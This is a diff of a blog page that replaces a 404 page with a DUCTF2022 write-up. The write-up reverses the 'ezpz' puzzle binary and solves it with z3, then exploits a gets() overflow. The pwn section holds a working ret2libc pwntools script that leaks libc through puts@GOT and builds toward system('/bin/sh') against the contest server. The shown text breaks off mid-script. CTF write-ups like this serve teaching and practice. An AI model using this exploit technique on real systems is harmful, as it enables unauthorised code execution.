@@ -6,10 +6,10 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1">
 
-  <title>Page not found</title>
-  <meta name='description' content='Malware Owl Blog on the Journey'>
+  <title>Trying out z3 Solver (DUCTF2022 - EZPZ RE + pwn)</title>
+  <meta name='description' content='I have always wanted to give z3 solver a try and had decided to use this for solving Ezpz from DUCTF2022.'>
 
-  <link rel="canonical" href="http://localhost:4000/404.html">
+  <link rel="canonical" href="http://localhost:4000/2022/09/26/Trying_out_z3_solver_(_DUCTF2022-EZPZ-rev-pwn)/">
   <link rel="alternate" type="application/rss+xml" title="Malware Owl" href="/feed.xml">
 
   <!-- Fonts -->
@@ -33,7 +33,7 @@
   
 
 <!-- begin header -->
-<header class="header header--top">
+<header class="header ">
   <div class="container">
     <div class="row">
       <div class="header__inner col col-12">
@@ -213,40 +213,774 @@
 
   <!-- begin content -->
   <main class="content" aria-label="Content">
-    <!-- begin hero -->
-
-<section class="hero">
-  <div class="hero__inner">
-    <div class="hero__image">
-      <img class="lazy" data-src="/images/140.jpg" alt="Page not found">
-    </div>
-    <div class="hero__content">
-      <h1 class="hero__title">Page not found</h1>
-    </div>
-  </div>
-</section>
-
-<!-- begin hero -->
-
-<!-- begin page -->
-<div class="container">
-  <article class="page animate">
-    <div class="page__content">
-      <div class="container">
-  <div class="row">
-    <div class="col col-12" style="text-align: center">
-      <h2 style="font-size: 48px">404</h2>
-      <p>The requested page could not be found.</p>
-      <p><a href="/" class="button button--middle" style="text-decoration: none; border: none">Back to the blog</a></p>
-      <hr>
+    <div class="post-head">
+  <div class="container">
+    <div class="row">
+      
+      <div class="col col-6 col-t-12">
+        <div class="image-box">
+          <img class="post-image lazy" data-src="/images/ductf2022ezpz/postpicture.png" alt="Trying out z3 Solver (DUCTF2022 - EZPZ RE + pwn)">
+        </div>
+      </div>
+      
+  
+      <div class="col col-6 col-t-12">
+        <div class="post-head__box">
+        
+          <div class="post__meta">
+            <span class="post__minutes">
+              
+              
+                16 min read
+              
+              <time class="post__date"
+                datetime="2022-09-26T03:08:00+08:00">Sep 26, 2022</time>
+            </span>
+          </div>
+        
+          <h2 class="post__title">Trying out z3 Solver (DUCTF2022 - EZPZ RE + pwn)</h2>
+        
+          <div class="post__bottom">
+        
+            <div class="post__author">
+              <a href="/about/" aria-label="MalwareOwl"><img class="post__author-image"
+                  src="/images/profile_avatar.png" alt="MalwareOwl's Picture"></a>
+            </div>
+        
+            <div class="post__bottom-meta">
+              <a href="/about/" class="post__author-link">MalwareOwl</a>
+              
+              <span>in</span>
+              <span class="post-tags">
+                
+                <a href="/tag/Writeups" class="post__tag">Writeups</a>
+                
+                <a href="/tag/CTF" class="post__tag">CTF</a>
+                
+              </span>
+              
+            </div>
+          </div>
+        
+        </div>
+      </div>
     </div>
   </div>
 </div>
 
+<!-- begin post -->
+<div class="container">
+  <article class="post animate">
+
+    <div class="post__content">
+      <h1 id="trying-out-z3-solver-ductf2022---ezpz-re--pwn">Trying out z3 Solver (DUCTF2022 - EZPZ RE + pwn)</h1>
+
+<h2 id="description">Description</h2>
+<p>Recently, I have started to play CTF. When doing big reverse engineering work, especially where parts may contain many arithmetic operations like when creating KeyGen, I believe that z3 is a really useful with the analysis. And since this is my first time trying out the Z3 Theorem Prover, I think it would be nice to note that down as part of my journey!</p>
+
+<p>In this post, I will deal mostly with the reversing and z3, but will not go too much into details about the pwning part since its a typical <code class="language-plaintext highlighter-rouge">gets</code> and ret2libc type challenge with a relatively old libc version. Also, I will go through the decompiled code with my renamed variable names which I hope is accurate.</p>
+
+<h2 id="lets-begin--ezpz-rev-">Let’s Begin ( EZPZ-REV )</h2>
+
+<p>When trying out the application, there were no outputs and was expected to put in any values. So, for short and incorrect values, we get the string “Incorrect!” and when we input long string, we get Segmentation Fault.</p>
+
+<p><img src="/images/ductf2022ezpz/segfault.png" alt="segfault.png" /></p>
+
+<p><em>Testing inputs</em></p>
+
+<p>After some reverse engineering and reformatting, we observe that there are 4 conditions that we need to meet before the flag is read and printed out.</p>
+
+<p><img src="/images/ductf2022ezpz/main_function.png" alt="/images/ductf2022ezpz" /></p>
+
+<p>One thing to note, the result from of the long string that was passed into the function can be treated as a hardcoded value via reading the value dynamically.</p>
+
+<h2 id="condition-1">Condition 1</h2>
+
+<p><img src="/images/ductf2022ezpz/condition1.png" alt="cond1" /></p>
+
+<p>In the first condition, it accepts the puzzle input as a 1D array which is calculated as a 2D array. It checks every row ( in steps of 14 ). For each row, it will see if the puzzle cell contains the value ‘1’. Finally, number of value ‘1’s must be 3.</p>
+
+<p>Now, we can start the script for the first condition. We first create the <code class="language-plaintext highlighter-rouge">Solver</code> object added the constraints of value being 1 and 0. Also, the puzzle cells values should be followed and therefore, the list comprehension is there to indicate to the solver the puzzle cells are the value we are trying to solve. At the end of writing the condition, we add another constraint that the number of ones should be 3. The reason that we can add puzzle cell directly is because of the first constraint of values being integer 1 or integer 0.</p>
+
+<p><img src="/images/ductf2022ezpz/z3_cond1.png" alt="z3_cond1.png" /></p>
+
+<h2 id="condition-2">Condition 2</h2>
+
+<p><img src="/images/ductf2022ezpz/condition2.png" alt="condition2.png" /></p>
+
+<p>This function is highly similar in construct as condition 1. Instead, it will loop through each column cell to check of the number of value ‘1’s. Again, we see that if the number of ‘1’s is not three, then it will fail.</p>
+
+<p>Very similar to the previous condition, this is the script that helped satisfy the second condition.</p>
+
+<p><img src="/images/ductf2022ezpz/z3_cond2.png" alt="/images/ductf2022ezpz" /></p>
+
+<h2 id="condition-3">Condition 3</h2>
+
+<p><img src="/images/ductf2022ezpz/condition3.png" alt="cond3" /></p>
+
+<p>This condition is the only one that deals with the decoded string. This decoded string has length of 196. It’s value is used to map <code class="language-plaintext highlighter-rouge">idx</code> of the <code class="language-plaintext highlighter-rouge">result_store[idx]</code>. Ultimately, the each values in the result_store should contain the number 3.</p>
+
+<p>The mapping is basically :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'a'  ==  'a'-'a'  == 0
+'b'  ==  'b'-'a'  == 1
+'c'  ==  'c'-'a'  == 2
+...
+...
+'n'  ==  'n'-'a'  == 14
+</code></pre></div></div>
+
+<p>To update the result_store entries :</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    For each cell in the puzzle, 
+        if the value is '1'
+            add one to the `result_store[idx]`
+</code></pre></div></div>
+
+<p>To check for correctness :</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    For i in result_store:
+        i == 3 
+</code></pre></div></div>
+
+<p>With that, we can convert these into a script. After understanding the condition, we have to reverse this into a function and add the constraints.</p>
+
+<p><img src="/images/ductf2022ezpz/z3_cond3.png" alt="/images/ductf2022ezpz" /></p>
+
+<h2 id="condition-4-last-condition">Condition 4 (Last condition)</h2>
+<p>Since I could not contain the decompiled code into one screenshot, I have dumped it here instead.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>__int64 __fastcall check_no_adjacent_ones_sub_4013B2(char *decoded, char *input_buffer)
+{
+  char *input; // rdi
+  int start_index; // er8
+  __int64 v4; // rbx
+  unsigned __int64 v5; // r10
+  unsigned int indexed_cell; // edx
+  int *index; // rcx
+  int index_; // edx
+  unsigned __int64 v9; // r10
+  __int64 column_idx; // rax
+  int index_array[8]; // [rsp+0h] [rbp-30h] BYREF
+  __int64 v13; // [rsp+20h] [rbp-10h] BYREF
+
+  input = input_buffer;
+  start_index = 0;
+  v4 = 0x10004001LL;
+  while ( 2 )                                   // for each column in a row
+  {
+    for ( column_idx = 0LL; column_idx != 14; ++column_idx )
+    {
+      if ( input[column_idx] == '1' )           // if input_buffer value is 1
+      {
+        index_array[0] = -1;
+        index_array[1] = -15;
+        index_array[2] = -14;
+        index_array[3] = -13;
+        index_array[4] = 1;
+        index_array[5] = 15;
+        index_array[6] = 14;
+        index_array[7] = 13;
+        for ( index = index_array; &amp;v13 != (__int64 *)index; ++index )// for each of the specified numbers
+        {
+          index_ = *index;
+          if ( (_DWORD)column_idx )             // if not the first column of any row
+          {
+            if ( (_DWORD)column_idx == 13 )     // last entry in the row ( edge )
+            {
+              v9 = (unsigned int)(index_ + 13);
+              if ( (unsigned int)v9 &lt;= 0x1C )
+              {
+                if ( _bittest64(&amp;v4, v9) )      // test if it falls on  position 0, 14 or 28
+                  continue;
+              }
+            }
+          }
+          else                                  // if first column of any row
+          {
+            v5 = (unsigned int)(index_ + 15);
+            if ( (unsigned int)v5 &lt;= 0x1C &amp;&amp; _bittest64(&amp;v4, v5) )
+              continue;
+          }
+          indexed_cell = start_index + column_idx + index_;
+          // Within range and not 1
+          // this means that we are looking to see that there are no adjacent cell
+          // containing the value 1 if the current cell is holding the value of 1
+          if ( indexed_cell &lt;= 0xC3 &amp;&amp; input_buffer[indexed_cell] == '1' )
+            return 0LL;
+        }
+      }
+    }
+    start_index += 14;                          // go next row
+    input += 14;
+    if ( input != input_buffer + 196 )          // check end of puzzle
+      continue;
+    break;
+  }
+  return 1LL;
+}
+</code></pre></div></div>
+
+<p>The index_array values are values used in calculation to see if the current cell that was processed is at the boundaries of the puzzle. This is important because the program is checking if the adjacent cells contains the value ‘1’ if current cell itself is containing the value ‘1’.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>000             000             100
+010             011             000 
+000             000             001
+
+PASS            FAIL            PASS
+</code></pre></div></div>
+
+<p>Also, we see the _bittest64 instruction was used in the assembly to check against the hex value 0x10004001. That is fancy way of checking if the value is either 0, 14 or 28.
+Now, if no value ‘1’s are adjacent to each other in all eight directions, then we pass this condition.</p>
+
+<p>To represent this in the script, I have googled on how to <a href="https://www.geeksforgeeks.org/find-all-adjacent-elements-of-given-element-in-a-2d-array-or-matrix/">find all adjacent elements of given element in a 2d array or matrix</a> and I ended up adapting it into the script. I have also inlined the <code class="language-plaintext highlighter-rouge">isValidPos</code> from the post to fit the condition into one function.</p>
+
+<p><img src="/images/ductf2022ezpz/z3_cond4.png" alt="z3_cond4.png" /></p>
+
+<p>At this point, we have all we need to make sure that the conditions are correct. To confirm that this is doable, we have to check for satisfiability and print out the evaluated puzzle cell values. The script will look like this.</p>
+
+<p><img src="/images/ductf2022ezpz/evaluate.png" alt="image" /></p>
+
+<h1 id="the-solve-script">The Solve Script</h1>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="o">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">~/</span><span class="n">CTF</span><span class="o">/</span><span class="n">ductf2022</span><span class="o">/</span><span class="n">ezpz</span><span class="o">-</span><span class="n">rev</span><span class="o">-</span><span class="n">pwn</span><span class="c1"># cat solve.py 
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">z3</span> <span class="kn">import</span> <span class="o">*</span> 
+<span class="n">s</span> <span class="o">=</span> <span class="n">Solver</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">print_puzzle</span><span class="p">(</span><span class="n">puzzle</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">14</span><span class="o">*</span><span class="mi">14</span><span class="p">,</span><span class="mi">14</span><span class="p">):</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">puzzle</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">14</span><span class="p">])</span>
+
+
+<span class="c1"># check that each row and column has just three '1's each 
+</span>
+<span class="n">puzzle</span><span class="o">=</span> <span class="p">[</span><span class="n">Int</span><span class="p">(</span><span class="s">'puzzle_%s'</span><span class="o">%</span><span class="p">(</span><span class="n">i</span><span class="p">))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">14</span><span class="o">*</span><span class="mi">14</span><span class="p">)]</span>
+<span class="c1"># make sure all value sin the puzzle are either 0 or 1
+</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">14</span><span class="o">*</span><span class="mi">14</span><span class="p">):</span>
+    <span class="n">s</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">puzzle</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;=</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">s</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">puzzle</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span>
+
+<span class="c1"># sub_401239
+</span><span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">14</span><span class="p">):</span>
+    <span class="n">count_each_row</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">14</span><span class="p">):</span>
+        <span class="n">count_each_row</span> <span class="o">+=</span> <span class="n">puzzle</span><span class="p">[</span><span class="n">r</span><span class="o">*</span><span class="mi">14</span><span class="o">+</span><span class="n">c</span><span class="p">]</span>
+    <span class="n">s</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">count_each_row</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span>
+
+<span class="c1"># sub_40129E
+</span><span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">14</span><span class="p">):</span>
+    <span class="n">count_each_column</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">14</span><span class="p">):</span>
+        <span class="n">count_each_column</span> <span class="o">+=</span>  <span class="n">puzzle</span><span class="p">[</span><span class="n">c</span> <span class="o">+</span> <span class="n">r</span><span class="o">*</span><span class="mi">14</span><span class="p">]</span>
+    <span class="n">s</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">count_each_column</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span>
+
+<span class="n">decoded_value</span> <span class="o">=</span> <span class="s">"aaaaabbbbcccddaaaaabbbbccccdaaeaaabbbccccdaaefaabbbcccgdeeefffffbccggdfeeffffggggggdfffffffhhhgggdffffhhhhhhgggdffijjjjhkkllmdiiijjkkkkkllmmiijjjkkkklllmmiijjjkkkklllmmijjjjjkknnllmmijjjjnnnnnllll"</span>
+
+
+
+<span class="c1"># this is to store to the correct store idx when it meets store_idx + ord('a')
+# for those that has value of '1', check the index at the decoded_value and store them in 
+# the result_store. Each entries in the result store shoudl be 3 each or it will fail
+</span><span class="s">"""
+    // if decoded idx is 'a' then store at index 0 in result_store
+    // if decoded idx is 'b' then store at index 1 in result_store 
+    // ...
+    // ...
+"""</span>
+<span class="k">for</span> <span class="n">store_idx</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">14</span><span class="p">):</span>
+    <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">14</span><span class="o">*</span><span class="mi">14</span><span class="p">):</span> <span class="c1"># For all puzzle cells , also the size of decoded value
+</span>        <span class="k">if</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s">'a'</span><span class="p">)</span> <span class="o">+</span> <span class="n">store_idx</span><span class="p">)</span> <span class="o">==</span> <span class="n">decoded_value</span><span class="p">[</span><span class="n">i</span><span class="p">]:</span> 
+            <span class="n">count</span> <span class="o">+=</span> <span class="n">puzzle</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>  <span class="c1"># due to constraint, we can just add the cell value (0 or 1)
+</span>    <span class="n">s</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">count</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span>
+       
+<span class="c1"># detect whether adjacent cells of the puzzle that contains 1 do not contain it as well.
+</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">14</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">14</span><span class="p">):</span>
+
+        <span class="c1"># used to fit the whole 8 conditions from validPos into a for loop
+</span>        <span class="n">left</span> <span class="o">=</span> <span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">]</span>
+        <span class="n">right</span> <span class="o">=</span> <span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">]</span>
+        <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
+        <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">left</span><span class="p">)):</span>
+            <span class="k">if</span> <span class="ow">not</span> <span class="p">((</span><span class="n">i</span><span class="o">+</span><span class="n">left</span><span class="p">[</span><span class="n">k</span><span class="p">])</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="ow">or</span> 
+                    <span class="p">(</span><span class="n">j</span><span class="o">+</span><span class="n">right</span><span class="p">[</span><span class="n">k</span><span class="p">])</span><span class="o">&lt;</span> <span class="mi">0</span> <span class="ow">or</span> 
+                    <span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="n">left</span><span class="p">[</span><span class="n">k</span><span class="p">])</span> <span class="o">&gt;</span> <span class="p">(</span><span class="mi">14</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="ow">or</span> 
+                    <span class="p">(</span><span class="n">j</span><span class="o">+</span><span class="n">right</span><span class="p">[</span><span class="n">k</span><span class="p">])</span> <span class="o">&gt;</span> <span class="p">(</span><span class="mi">14</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)):</span> <span class="c1"># if valid adjacent cell is present
+</span>                <span class="n">count</span> <span class="o">+=</span> <span class="n">puzzle</span><span class="p">[(</span><span class="n">i</span><span class="o">+</span><span class="n">left</span><span class="p">[</span><span class="n">k</span><span class="p">])</span><span class="o">*</span><span class="mi">14</span><span class="o">+</span><span class="p">(</span><span class="n">j</span><span class="o">+</span><span class="n">right</span><span class="p">[</span><span class="n">k</span><span class="p">])]</span> 
+
+        <span class="c1"># the muliplying i believe forces the relation with puzzle cells in z3 or anything goes
+</span>        <span class="n">s</span><span class="p">.</span><span class="n">add</span><span class="p">((</span><span class="n">count</span><span class="o">*</span><span class="n">puzzle</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">14</span><span class="o">+</span><span class="n">j</span><span class="p">])</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> 
+
+
+<span class="n">password</span> <span class="o">=</span> <span class="s">""</span>
+<span class="k">if</span> <span class="n">s</span><span class="p">.</span><span class="n">check</span><span class="p">()</span> <span class="o">==</span> <span class="n">sat</span><span class="p">:</span>
+    <span class="n">m</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">model</span><span class="p">()</span>
+    <span class="n">answer</span> <span class="o">=</span> <span class="p">[</span><span class="n">m</span><span class="p">.</span><span class="n">evaluate</span><span class="p">(</span><span class="n">puzzle</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">14</span><span class="o">*</span><span class="mi">14</span><span class="p">)]</span>
+    
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">answer</span><span class="p">:</span>
+        <span class="n">password</span><span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
+
+<span class="k">else</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"Problem is unsatisfiable :("</span><span class="p">)</span>
+    <span class="k">pass</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"end program"</span><span class="p">)</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"2022.ductf.dev"</span><span class="p">,</span><span class="mi">30005</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">recvrepeat</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">password</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Running this will get us the flag if all goes well.</p>
+
+<p><img src="/images/ductf2022ezpz/rev-flag.png" alt="flag" /></p>
+
+<h1 id="ductfgr1d_puzzl3s_ar3_t00_ez_r1ght">DUCTF{gr1d_puzzl3s_ar3_t00_ez_r1ght?}</h1>
+
+<hr />
+
+<h1 id="now-to-the-pwn">Now to the PWN</h1>
+
+<p>So where is the bug? Well, you probably have already noticed that it uses the vulnerable function <code class="language-plaintext highlighter-rouge">gets</code> which allows us to write any buffer length of data into the stack buffer. The only reason we cannot start the pwn challenge immediately is because we do want to exit the program. We need it to get the flag for ezpz-rev and eventually reach the <code class="language-plaintext highlighter-rouge">ret</code> instruction of this function.</p>
+
+<p><img src="/images/ductf2022ezpz/pwnblock.png" alt="pwnblock.png" /></p>
+
+<p>Now that we know the puzzle input to get the flag, we can reach the ret statement after inputting more than 232 characters before do any changes to the instruction pointer. Before continuing, we also know that no canaries is there to block the overflow attempt, no pie is there to mess up the instruction address of the binary and that NX is enabled. This suggest that we can use ROP chain to ret2libc. It is also convenient that the libc used on the server was provided as well.
+<img src="/images/ductf2022ezpz/security.png" alt="security.png" />]</p>
+
+<h2 id="exploit-step-and-script">Exploit Step and Script</h2>
+
+<p>First Stage:</p>
+<ol>
+  <li>Puzzle cells + padding to 232</li>
+  <li>Pop GOT of puts to rdi</li>
+  <li>ret to puts PLT to leak libc of puts  –&gt; puts(puts@GOT)</li>
+  <li>ret the main function  –&gt; restart program</li>
+</ol>
+
+<p>Calculate the libc address based on the offset from the libc file and calculate the address of “/bin/sh” and system</p>
+
+<p>Second Stage:</p>
+<ol>
+  <li>Puzzle cells + padding to 232</li>
+  <li>pop address of “/bin/sh” into rdi</li>
+  <li>ret gadget (to apease MOVAPS in do_system)</li>
+  <li>ret to system PLT  –&gt; system(“/bin/sh”)</li>
+</ol>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">LOCAL</span> <span class="o">=</span> <span class="bp">False</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="s">""</span>
+
+
+<span class="k">if</span> <span class="n">LOCAL</span><span class="p">:</span>
+    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"/usr/lib/x86_64-linux-gnu/libc-2.31.so"</span><span class="p">)</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./ezpz"</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>   
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"2022.ductf.dev"</span><span class="p">,</span> <span class="mi">30005</span><span class="p">)</span>
+    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"libc-2.35.so"</span><span class="p">)</span>
+
+
+<span class="c1"># gadgets
+</span><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x00000000004015d3</span>
+<span class="n">pop_rsi_r15</span> <span class="o">=</span> <span class="mh">0x00000000004015d1</span>
+<span class="n">ret</span> <span class="o">=</span> <span class="mh">0x00000000004015d4</span>
+
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./ezpz"</span><span class="p">)</span>
+<span class="n">puts_offset</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
+<span class="n">system_offset</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"OFFSET : "</span> <span class="p">,</span> <span class="n">puts_offset</span><span class="p">)</span>
+<span class="n">putsPLT</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
+<span class="n">putsGOT</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
+<span class="n">main_function</span> <span class="o">=</span> <span class="mh">0x00004014A0</span>
+
+<span class="c1">#main_plt = elf.symbols['main']
+</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"0101000000001000000101010000101000000001000000000101000110100000000100000010101000000100000000100100001010100000001000000010101000101000000000000000101010010101000000000000000001010100010101000000AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">putsGOT</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">putsPLT</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"putsGOT : "</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">putsGOT</span><span class="p">))</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">main_function</span><span class="p">)</span>
+
+
+
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvrepeat</span><span class="p">(</span><span class="mf">0.6</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"ORIGINAL LEAK"</span><span class="p">,</span><span class="n">leak</span><span class="p">)</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\n\n</span><span class="s">"</span><span class="p">)[</span><span class="mi">1</span><span class="p">][:</span><span class="mi">8</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"LEAK : "</span> <span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
+
+<span class="n">libc_base</span> <span class="o">=</span><span class="p">(</span> <span class="n">leak</span> <span class="o">-</span> <span class="n">puts_offset</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffffffff</span>
+<span class="n">system_address</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span>  <span class="n">system_offset</span>
+
+
+<span class="k">print</span><span class="p">(</span><span class="s">"leaked puts libs : "</span> <span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"puts_offset : "</span> <span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">puts_offset</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"libc_base : "</span> <span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"Leaked system libc address : "</span> <span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_address</span><span class="p">))</span>
+<span class="n">binsh_offset</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">"/bin/sh"</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"binsh offset : "</span> <span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">binsh_offset</span><span class="p">))</span>
+<span class="n">binsh_address</span> <span class="o">=</span> <span class="n">binsh_offset</span> <span class="o">+</span> <span class="n">system_address</span> <span class="o">-</span> <span class="n">system_offset</span>
